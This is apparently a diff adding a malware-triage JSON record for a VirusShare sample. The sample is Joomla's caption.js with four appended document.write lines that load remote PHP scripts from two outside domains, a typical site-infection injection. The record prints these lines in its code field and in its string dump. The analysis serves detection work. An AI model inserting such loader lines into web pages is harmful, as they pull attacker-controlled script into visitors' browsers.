@@ -1,0 +1,99 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Open": "May open a file",
+            "Windows": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "/**\n* @version\t\t$Id: caption.js 5263 2006-10-02 01:25:24Z webImagery $\n* @copyright\tCopyright (C) 2005 - 2009 Open Source Matters. All rights reserved.\n* @license\t\tGNU/GPL, see LICENSE.php\n* Joomla! is free software. This version may have been modified pursuant\n* to the GNU General Public License, and as distributed it includes or\n* is derivative of works licensed under the GNU General Public License or\n* other free or open source software licenses.\n* See COPYRIGHT.php for copyright notices and details.\n*/\n\n/**\n* JCaption javascript behavior\n*\n* Used for displaying image captions\n*\n* @package\tJoomla\n* @since\t1.5\n* @version\t1.0\n*/\nvar JCaption = new Class({\n\tinitialize: function(selector)\n\t{\n\t\tthis.selector = selector;\n\n\t\tvar images = $$(selector);\n\t\timages.each(function(image){ this.createCaption(image); }, this);\n\t},\n\n\tcreateCaption: function(element)\n\t{\n\t\tvar caption   = document.createTextNode(element.title);\n\t\tvar container = document.createElement(\"div\");\n\t\tvar text      = document.createElement(\"p\");\n\t\tvar width     = element.getAttribute(\"width\");\n\t\tvar align     = element.getAttribute(\"align\");\n\t\tvar docMode = document.documentMode;\n\n\t\t//Windows fix\n\t\tif (!align)\n\t\t\talign = element.getStyle(\"float\");  // Rest of the world fix\n\t\tif (!align) // IE DOM Fix\n\t\t\talign = element.style.styleFloat;\n\n\t\ttext.appendChild(caption);\n\t\ttext.className = this.selector.replace('.', '_');\n\n\t\tif (align==\"none\") {\n\t\t\tif (element.title != \"\") {\n\t\t\t\telement.parentNode.replaceChild(text, element);\n\t\t\t\ttext.parentNode.insertBefore(element, text);\n\t\t\t}\n\t\t} else {\n\t\t\telement.parentNode.insertBefore(container, element);\n\t\t\tcontainer.appendChild(element);\n\t\t\tif ( element.title != \"\" ) {\n\t\t\t\tcontainer.appendChild(text);\n\t\t\t}\n\t\t\tcontainer.className   = this.selector.replace('.', '_');\n\t\t\tcontainer.className   = container.className + \" \" + align;\n\t\t\tcontainer.setAttribute(\"style\",\"float:\"+align);\n\n\t\t\t//IE8 fix\n\t\t\tif (!docMode|| docMode < 8) {\n\t\t\t\tcontainer.style.width = width + \"px\";\n\t\t\t}\n\t\t}\n\n\t}\n});\n\ndocument.caption = null;\nwindow.addEvent('load', function() {\n\tvar caption = new JCaption('img.caption')\n\tdocument.caption = caption\n});\n\ndocument.write('<script src=http://performancesynergy.co.za/img/Seta.php ><\\/script>');\ndocument.write('<script src=http://performancesynergy.co.za/img/Seta.php ><\\/script>');\ndocument.write('<script src=http://alattaa.com/Library/about-chairman.php ><\\/script>');\ndocument.write('<script src=http://alattaa.com/Library/about-chairman.php ><\\/script>');"
+    },
+    "filename": "VirusShare_2dfe1fdce011ec426eab4f30b7774ec2",
+    "filesize": 2504,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "2dfe1fdce011ec426eab4f30b7774ec2",
+        "sha1": "19ff5f0d29f53408ac6dc1966b15d31925707a11",
+        "sha256": "8c54f62a14bd892d5533d4080e8520d5e209a41192681ee7e1e32b7a5cbf9944"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "* @version\t\t$Id: caption.js 5263 2006-10-02 01:25:24Z webImagery $",
+            "* @copyright\tCopyright (C) 2005 - 2009 Open Source Matters. All rights reserved.",
+            "* @license\t\tGNU/GPL, see LICENSE.php",
+            "* Joomla! is free software. This version may have been modified pursuant",
+            "* to the GNU General Public License, and as distributed it includes or",
+            "* is derivative of works licensed under the GNU General Public License or",
+            "* other free or open source software licenses.",
+            "* See COPYRIGHT.php for copyright notices and details.",
+            "* JCaption javascript behavior",
+            "* Used for displaying image captions",
+            "* @package\tJoomla",
+            "* @since\t1.5",
+            "* @version\t1.0",
+            "var JCaption = new Class({",
+            "\tinitialize: function(selector)",
+            "\t\tthis.selector = selector;",
+            "\t\tvar images = $$(selector);",
+            "\t\timages.each(function(image){ this.createCaption(image); }, this);",
+            "\tcreateCaption: function(element)",
+            "\t\tvar caption   = document.createTextNode(element.title);",
+            "\t\tvar container = document.createElement(\"div\");",
+            "\t\tvar text      = document.createElement(\"p\");",
+            "\t\tvar width     = element.getAttribute(\"width\");",
+            "\t\tvar align     = element.getAttribute(\"align\");",
+            "\t\tvar docMode = document.documentMode;",
+            "\t\t//Windows fix",
+            "\t\tif (!align)",
+            "\t\t\talign = element.getStyle(\"float\");  // Rest of the world fix",
+            "\t\tif (!align) // IE DOM Fix",
+            "\t\t\talign = element.style.styleFloat;",
+            "\t\ttext.appendChild(caption);",
+            "\t\ttext.className = this.selector.replace('.', '_');",
+            "\t\tif (align==\"none\") {",
+            "\t\t\tif (element.title != \"\") {",
+            "\t\t\t\telement.parentNode.replaceChild(text, element);",
+            "\t\t\t\ttext.parentNode.insertBefore(element, text);",
+            "\t\t\t}",
+            "\t\t} else {",
+            "\t\t\telement.parentNode.insertBefore(container, element);",
+            "\t\t\tcontainer.appendChild(element);",
+            "\t\t\tif ( element.title != \"\" ) {",
+            "\t\t\t\tcontainer.appendChild(text);",
+            "\t\t\t}",
+            "\t\t\tcontainer.className   = this.selector.replace('.', '_');",
+            "\t\t\tcontainer.className   = container.className + \" \" + align;",
+            "\t\t\tcontainer.setAttribute(\"style\",\"float:\"+align);",
+            "\t\t\t//IE8 fix",
+            "\t\t\tif (!docMode|| docMode < 8) {",
+            "\t\t\t\tcontainer.style.width = width + \"px\";",
+            "\t\t\t}",
+            "document.caption = null;",
+            "window.addEvent('load', function() {",
+            "\tvar caption = new JCaption('img.caption')",
+            "\tdocument.caption = caption",
+            "document.write('<script src=http://performancesynergy.co.za/img/Seta.php ><\\/script>');",
+            "document.write('<script src=http://performancesynergy.co.za/img/Seta.php ><\\/script>');",
+            "document.write('<script src=http://alattaa.com/Library/about-chairman.php ><\\/script>');",
+            "document.write('<script src=http://alattaa.com/Library/about-chairman.php ><\\/script>');"
+        ],
+        "file": {
+            "* @license\t\tGNU/GPL, see LICENSE.php": "Web Page"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://alattaa.com/Library/about-chairman.php",
+            "http://performancesynergy.co.za/img/Seta.php"
+        ]
+    },
+    "time": "0:00:00.285624",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
